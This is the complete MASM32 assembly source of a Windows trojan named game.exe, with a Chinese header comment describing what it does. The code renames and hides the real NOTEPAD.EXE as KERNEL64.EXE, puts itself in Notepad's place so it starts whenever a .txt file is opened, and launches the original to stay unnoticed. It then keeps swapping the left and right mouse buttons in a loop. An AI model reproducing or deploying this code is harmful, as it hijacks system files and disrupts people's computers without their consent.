;*****************************************************
;                 game.exe源代码
;作者：DDV
;编译条件：MASM32
;说明：将WINDOWS文件夹中的NOTEPAD.EXE文件改名为：
;      KERNEL64.EXE，并将本文件复制到系统中作为
;      NOTEPAD.EXE文件.当系统打开*.TXT文件时,本
;      程序启动,并同时打开原记事本程序kernel64.exe
;      随后，每30秒交换一次鼠标的左右键。 

;*****************************************************


 .386 
 .model flat,stdcall 
option casemap:none 
include c:\masm32\include\windows.inc 
include c:\masm32\include\user32.inc 
include c:\masm32\include\kernel32.inc 
include c:\masm32\include\comdlg32.inc 
include c:\masm32\include\advapi32.inc
include c:\masm32\include\shell32.inc
includelib c:\masm32\lib\user32.lib 
includelib c:\masm32\lib\kernel32.lib 
includelib c:\masm32\lib\comdlg32.lib 
includelib c:\masm32\lib\advapi32.lib
includelib c:\masm32\lib\shell32.lib
 .data 
mine db "game.exe",0
open db "open",0
notpad db "kernel64.exe",0
notpad2 db "\kernel64.exe",0
notpad3 db "\NOTEPAD.EXE",0
 .data? 
hfile HWND ?
hMemory HANDLE ?                            
pMemory DWORD ?  
hIn HINSTANCE ?
pathsys  db 256 dup(?)
hsys db ?
time SYSTEMTIME <?>
stStartUp	STARTUPINFO		<?>
stProcInfo	PROCESS_INFORMATION	<?>
stOpenFileName	OPENFILENAME	<?>
comd  db 256 dup(?)
comd2 db 256 dup(?)
 .code 
start: 
invoke GetWindowsDirectory, addr comd,256
invoke lstrcat,offset comd,OFFSET notpad3
invoke GetWindowsDirectory, addr comd2,256
invoke lstrcat,offset comd2,OFFSET notpad2
invoke CopyFile, addr comd,addr comd2,TRUE
invoke SetFileAttributes ,addr comd2,FILE_ATTRIBUTE_HIDDEN
invoke GetWindowsDirectory, addr pathsys,256
invoke lstrcat,offset pathsys,OFFSET notpad3
invoke CopyFile, addr mine,addr pathsys,0
invoke SetFileAttributes ,addr mine,FILE_ATTRIBUTE_HIDDEN
invoke GetStartupInfo,addr stStartUp
invoke CreateProcess,0,addr notpad,NULL,NULL,\
       0,NORMAL_PRIORITY_CLASS,NULL,NULL,offset stStartUp,offset stProcInfo
   .while TRUE
get:
invoke GetSystemTime ,ADDR time
      .BREAK .IF (time.wSecond==30)
      .BREAK .IF (time.wSecond==15)
      .BREAK .IF (time.wSecond==45)
      .break .if (time.wSecond==0)
   .ENDW
invoke SwapMouseButton,FALSE
   .IF EaX==0
invoke SwapMouseButton,TRUE
   .ENDIF
jmp get
invoke ExitProcess,0
end start